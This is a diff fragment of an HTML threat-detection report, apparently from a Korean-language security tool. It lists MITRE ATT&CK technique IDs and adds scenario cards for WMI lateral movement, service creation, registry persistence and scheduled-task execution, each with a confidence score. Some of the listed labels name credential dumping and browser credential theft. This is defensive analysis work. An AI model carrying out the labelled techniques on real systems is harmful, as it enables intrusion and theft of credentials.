-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1135</span>
       <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1059.001</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1003.001</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1047</span>
       <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1105</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1202</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1057</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1218.003</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1218.010</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1018</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1567.002</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1113</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1562.004</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1070.001</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1569.002</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1115</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1555.003</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1543.003</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1003.002</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1482</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1218.004</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1547.001</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1562.001</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1053.005</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1021.006</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1087.002</span>
     </p>
     <p><b>연관 체인 수:</b> 1</p>
     <details>
@@ -3185,6 +3188,94 @@
       <div style="margin: 8px 0; padding: 8px; background: white; border-left: 3px solid #4a90e2;">
         <b>chain_1_download_exec</b> - download_exec<br>
         <small>웹 다운로드 후 실행 파일 실행</small>
+      </div>
+    </details>
+  </div>
+  <div style="border: 2px solid #4a90e2; margin: 16px 0; padding: 16px; border-radius: 4px; background: #f8f9fa;">
+    <h4>WMI를 통한 측면 이동 (신뢰도: 0.74)</h4>
+    <p><b>시나리오 ID:</b> scope_5842930ae7fbcadd_scenario_1_wmi_lateral</p>
+    <p><b>공격 단계:</b> lateral_movement</p>
+    <p><b>설명:</b> WMI를 이용한 원격 시스템에서의 프로세스 실행</p>
+    <p><b>관련 MITRE 기법:</b>
+      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1047</span>
+    </p>
+    <p><b>연관 체인 수:</b> 1</p>
+    <details>
+      <summary>연관 체인 상세</summary>
+      <div style="margin: 8px 0; padding: 8px; background: white; border-left: 3px solid #4a90e2;">
+        <b>activity_6</b> - activity<br>
+        <small>동일 호스트/사용자의 30분 이내 활동 묶음</small>
+      </div>
+    </details>
+  </div>
+  <div style="border: 2px solid #4a90e2; margin: 16px 0; padding: 16px; border-radius: 4px; background: #f8f9fa;">
+    <h4>서비스 생성 및 실행 (신뢰도: 0.74)</h4>
+    <p><b>시나리오 ID:</b> scope_5842930ae7fbcadd_scenario_2_service_creation</p>
+    <p><b>공격 단계:</b> persistence</p>
+    <p><b>설명:</b> Windows 서비스 생성을 통한 영구성 및 실행</p>
+    <p><b>관련 MITRE 기법:</b>
+      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1543.003</span>
+    </p>
+    <p><b>연관 체인 수:</b> 1</p>
+    <details>
+      <summary>연관 체인 상세</summary>
+      <div style="margin: 8px 0; padding: 8px; background: white; border-left: 3px solid #4a90e2;">
+        <b>activity_6</b> - activity<br>
+        <small>동일 호스트/사용자의 30분 이내 활동 묶음</small>
+      </div>
+    </details>
+  </div>
+  <div style="border: 2px solid #4a90e2; margin: 16px 0; padding: 16px; border-radius: 4px; background: #f8f9fa;">
+    <h4>레지스트리 영구성 설정 (신뢰도: 0.88)</h4>
+    <p><b>시나리오 ID:</b> scope_91503828c10265d6_scenario_1_registry_persistence</p>
+    <p><b>공격 단계:</b> persistence</p>
+    <p><b>설명:</b> 레지스트리 Run/RunOnce 키를 통한 자동 실행 설정</p>
+    <p><b>관련 MITRE 기법:</b>
+      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1053.005</span>
+      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1547.001</span>
+    </p>
+    <p><b>연관 체인 수:</b> 1</p>
+    <details>
+      <summary>연관 체인 상세</summary>
+      <div style="margin: 8px 0; padding: 8px; background: white; border-left: 3px solid #4a90e2;">
+        <b>activity_9</b> - activity<br>
+        <small>동일 호스트/사용자의 30분 이내 활동 묶음</small>
+      </div>
+    </details>
+  </div>
+  <div style="border: 2px solid #4a90e2; margin: 16px 0; padding: 16px; border-radius: 4px; background: #f8f9fa;">
+    <h4>스케줄된 작업을 통한 실행 (신뢰도: 0.88)</h4>
+    <p><b>시나리오 ID:</b> scope_91503828c10265d6_scenario_2_scheduled_task_execution</p>
+    <p><b>공격 단계:</b> execution</p>
+    <p><b>설명:</b> 스케줄된 작업 생성 및 실행을 통한 공격</p>
+    <p><b>관련 MITRE 기법:</b>
+      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1053.005</span>
+      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1547.001</span>
+    </p>
+    <p><b>연관 체인 수:</b> 1</p>
+    <details>
+      <summary>연관 체인 상세</summary>
+      <div style="margin: 8px 0; padding: 8px; background: white; border-left: 3px solid #4a90e2;">
+        <b>activity_9</b> - activity<br>
+        <small>동일 호스트/사용자의 30분 이내 활동 묶음</small>
+      </div>
+    </details>
+  </div>
+  <div style="border: 2px solid #4a90e2; margin: 16px 0; padding: 16px; border-radius: 4px; background: #f8f9fa;">
+    <h4>서비스 생성 및 실행 (신뢰도: 0.88)</h4>
+    <p><b>시나리오 ID:</b> scope_91503828c10265d6_scenario_3_service_creation</p>
+    <p><b>공격 단계:</b> persistence</p>
+    <p><b>설명:</b> Windows 서비스 생성을 통한 영구성 및 실행</p>
+    <p><b>관련 MITRE 기법:</b>
+      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1543.003</span>
+      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1547.001</span>
+    </p>
+    <p><b>연관 체인 수:</b> 1</p>
+    <details>
+      <summary>연관 체인 상세</summary>
+      <div style="margin: 8px 0; padding: 8px; background: white; border-left: 3px solid #4a90e2;">
+        <b>activity_9</b> - activity<br>
+        <small>동일 호스트/사용자의 30분 이내 활동 묶음</small>
       </div>
     </details>
   </div>
